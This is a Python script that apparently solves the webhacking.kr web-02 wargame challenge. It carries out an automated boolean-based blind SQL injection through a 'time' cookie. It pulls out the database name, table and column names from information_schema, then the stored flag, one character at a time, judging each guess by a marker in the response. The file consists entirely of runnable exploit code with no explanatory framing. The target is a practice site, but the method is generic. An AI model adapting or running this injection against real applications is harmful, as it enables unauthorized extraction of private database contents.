import requests
import string

url="https://webhacking.kr/challenge/web-02/"
cookies={"PHPSESSID":"your session"}
ascii_code=string.digits+string.ascii_letters+string.punctuation
utf="utf-8"

def getDBLength():
    for i in range(1,100):
        cookies["time"]="LENGTH(DATABASE())={}".format(i)
        response=requests.post(url, cookies=cookies)
        if response.text.find("09:00:01")>0:
            print("(+) DB length is {}".format(i))
            return i

def getDBName(dbLen):

    dbName=""
    for i in range(1, dbLen+1):
        for chrct in ascii_code:
            cookies["time"]="SUBSTR(DATABASE(), {}, 1)='{}'".format(i, chrct)
            response=requests.post(url, cookies=cookies)
            if response.text.find("09:00:01") > 0:
                print("(+) Find {}th character is {}".format(i, chrct))
                dbName+=chrct
                break

    print("(+) DB name is {}".format(dbName))
    return dbName

def getTableLength(dbName):
    res={}
    for i in range(1, 100):
        cookies["time"]="LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT 0,1)) = {}".format(dbName, i)
        response = requests.post(url, cookies=cookies)
        if response.text.find("09:00:01") > 0:
            print("(+) Table length is {}".format(i))
            res["tableLen"]=i
            res["dbName"]=dbName
            return res

def getTableName(res):

    tableName=""
    for i in range(1, res["tableLen"]+1):
        for chrct in ascii_code:
            cookies["time"]="SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT 0,1), {}, 1)='{}'".format(res["dbName"], i, chrct)
            response=requests.post(url, cookies=cookies)
            if response.text.find("09:00:01") > 0:
                print("(+) Find {}th character is {}".format(i, chrct))
                tableName+=chrct
                break
        if(len(tableName)==i-1):
            print("(!) Not find {}th character".format(i))
            tableName+="?"
    print("(+) Table name is {}".format(tableName))
    return tableName

def getAttributeLength(tableName):
    res = {}
    for i in range(1, 100):
        cookies["time"] = "LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 0,1))={}".format(tableName, i)
        response = requests.post(url, cookies=cookies)
        if response.text.find("09:00:01") > 0:
            print("(+) Attribute length is {}".format(i))
            res["attrlen"] = i
            res["tableName"] = tableName
            return res

def getAttributeName(res):

    attributeName = ""
    for i in range(1, res["attrlen"] + 1):
        for chrct in ascii_code:
            cookies["time"] = "SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 0,1), {}, 1)='{}'".format(res["tableName"], i, chrct)
            response = requests.post(url, cookies=cookies)
            if response.text.find("09:00:01") > 0:
                print("(+) Find {}th character is {}".format(i, chrct))
                attributeName += chrct
                break
        if (len(attributeName) == i - 1):
            print("(!) Not find {}th character".format(i))
            attributeName += "?"
    print("(+) Attribute name is {}".format(attributeName))
    res["attrName"]=attributeName
    return res

def getFlagLength(res):
    for i in range(1, 100):
        cookies["time"] = "LENGTH((SELECT {} FROM {} LIMIT 1))={}".format(res['attrName'], res['tableName'], i)
        response = requests.post(url, cookies=cookies)
        if response.text.find("09:00:01") > 0:
            print("(+) Flag length is {}".format(i))
            res["flagLen"] = i
            return res

def getFlag(res):

    flag = ""
    for i in range(1, res["flagLen"] + 1):
        for chrct in ascii_code:
            cookies["time"] = "SUBSTR((SELECT {} FROM {} LIMIT 0,1), {}, 1)='{}'".format(res["attrName"], res['tableName'], i, chrct)
            response = requests.post(url, cookies=cookies)
            if response.text.find("09:00:01") > 0:
                print("(+) Find {}th character is {}".format(i, chrct))
                flag += chrct
                break
        if (len(flag) == i - 1):
            print("(!) Not find {}th character".format(i))
            flag += "?"
    print("(+) Flag is {}".format(flag))

if __name__=="__main__":
    getFlag(getFlagLength(getAttributeName(getAttributeLength(getTableName(getTableLength(getDBName(getDBLength())))))))

